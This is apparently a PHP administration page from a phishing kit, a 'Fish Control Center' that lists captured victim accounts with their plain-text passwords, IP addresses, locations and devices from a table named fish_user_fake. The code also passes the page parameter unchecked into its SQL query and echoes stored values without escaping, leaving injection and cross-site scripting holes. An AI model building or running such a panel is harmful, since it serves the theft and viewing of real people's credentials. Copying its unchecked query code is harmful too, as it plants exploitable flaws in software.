﻿<?php
include("../include/common.php");
if ($islogin == 1) {
} else exit("<script language='javascript'>window.location.href='./login.php';</script>");
?>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>KK Zone Fish Control Center</title>
    <link href="//cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet"/>
    <script src="//cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
    <script src="//cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <!--[if lt IE 9]>
    <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>
<body>
<?php
$pagesize = 15;
if (!isset($_GET['page'])) {
    $page = 1;
    $pageu = $page - 1;
} else {
    $page = $_GET['page'];
    $pageu = ($page - 1) * $pagesize;
} ?>
<nav class="navbar navbar-fixed-top navbar-default">
    <div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar"
                    aria-expanded="false" aria-controls="navbar">
                <span class="sr-only">Navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="./">KK Zone Fish Control Center</a>
        </div><!-- /.navbar-header -->
        <div id="navbar" class="collapse navbar-collapse">
            <ul class="nav navbar-nav navbar-right">
                <li class="">
                    <a href="./"><span class="glyphicon glyphicon-user"></span> Index</a>
                </li>
                <li class="active">
                    <a href="./list.php"><span class="glyphicon glyphicon-calendar"></span> Fish Management</a>
                </li>
                <li><a href="./login.php?logout"><span class="glyphicon glyphicon-log-out"></span> Logout</a></li>
            </ul>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</nav><!-- /.navbar -->
<div class="container" style="padding-top:70px;">
    <div class="col-md-12 center-block" style="float: none;">
        <div class="table-responsive">
            <table class="table table-striped">
                <thead>
                <tr>
                    <th>Fish Account</th>
                    <th>Fish Password</th>
                    <th>Login IP</th>
                    <th>Login Address</th>
                    <th>Login Time</th>
                    <th>Login Device</th>
                </tr>
                </thead>
                <tbody>
                <tbody>
                <?php
                $sum = $DB->count("SELECT count(*) from fish_user_fake");
                $output = $DB->count("SELECT count(*) from fish_user_fake where output=1");
                $rs = $DB->query("SELECT * FROM fish_user_fake order by id desc limit $pageu,$pagesize");
                while ($res = $DB->fetch($rs)) {
                    if ($res['output'] == 0) {
                        $res['output'] = 'Yes';
                    } else {
                        $res['output'] = 'No';
                    }
                    echo '<tr><td>' . $res['username'] . '</td><td>' . $res['password'] . '</td><td>' . $res['ip'] . '</td><td>' . $res['address'] . '</td><td>' . $res['time'] . '</td><td>' . $res['device'] . '</td></tr>';
                }
                ?>
                </tbody>
            </table>
        </div>
        <?php
        echo '<ul class="pagination">';
        $s = ceil($gls / $pagesize);
        $first = 1;
        $prev = $page - 1;
        $next = $page + 1;
        $last = $s;
        if ($page > 1) {
            echo '<li><a href="list.php?page=' . $first . $link . '">First Page</a></li>';
            echo '<li><a href="list.php?page=' . $prev . $link . '">&laquo;</a></li>';
        } else {
            echo '<li class="disabled"><a>First Page</a></li>';
            echo '<li class="disabled"><a>&laquo;</a></li>';
        }
        for ($i = 1; $i < $page; $i++)
            echo '<li><a href="list.php?page=' . $i . $link . '">' . $i . '</a></li>';
        echo '<li class="disabled"><a>' . $page . '</a></li>';
        for ($i = $page + 1; $i <= $s; $i++)
            echo '<li><a href="list.php?page=' . $i . $link . '">' . $i . '</a></li>';
        echo '';
        if ($page < $s) {
            echo '<li><a href="list.php?page=' . $next . $link . '">&raquo;</a></li>';
            echo '<li><a href="list.php?page=' . $last . $link . '">Last Page</a></li>';
        } else {
            echo '<li class="disabled"><a>&raquo;</a></li>';
            echo '<li class="disabled"><a>Last Page</a></li>';
        }
        echo '</ul>';
        ?>
    </div>
</div>
